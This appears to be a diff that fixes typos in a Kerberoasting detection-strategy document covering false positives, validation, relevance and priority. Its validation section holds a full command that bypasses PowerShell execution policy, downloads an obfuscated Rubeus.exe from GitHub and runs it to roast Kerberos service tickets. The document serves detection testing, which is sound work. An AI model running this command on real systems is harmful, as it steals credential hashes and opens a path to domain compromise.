@@ -36,7 +36,7 @@ There are several instances where false positives for this ADS could occur:
 * Users explicitly performing SPN enumeration as part of SQL jobs
 * Automated internal red-team testing
 
-Most false positives can be tracked back to DBA's running scritps that enumerate SPN's and red team activity.
+Most false positives can be tracked back to DBA's running scripts that enumerate SPN's and red team activity.
 
 # Validation
 Validation can occur by utilize Rubeus.exe to enumerate SPN's and harvest weak RC4 hashes.
@@ -44,7 +44,7 @@ Validation can occur by utilize Rubeus.exe to enumerate SPN's and harvest weak R
 %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe Set-ExecutionPolicy Bypass -scope Process -Force; %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri "https://github.com/Flangvik/ObfuscatedSharpCollection/raw/main/NetFramework_4.7_Any/Rubeus.exe._obf.exe" -OutFile "C:\ProgramData\Rubeus.exe"; C:\Windows\System32\cmd.exe /C C:\ProgramData\Rubeus.exe kerberoast
 ```
 # Relevance
-Althought many environments no logner have weak RC4 hashes to easily get roasted, it is still a good detection to have to cover this attack vector. It is one of the easiest ways to compromise an elevated priileged account and allow an attacker to pivot to domain compromise.
+Although many environments no longer have weak RC4 hashes to easily get roasted, it is still a good detection to have to cover this attack vector. It is one of the easiest ways to compromise an elevated privileged account and allow an attacker to pivot to domain compromise.
 
 # Priority
 If this detection can be tuned properly, the severity should be a Critical with a 100 risk score.
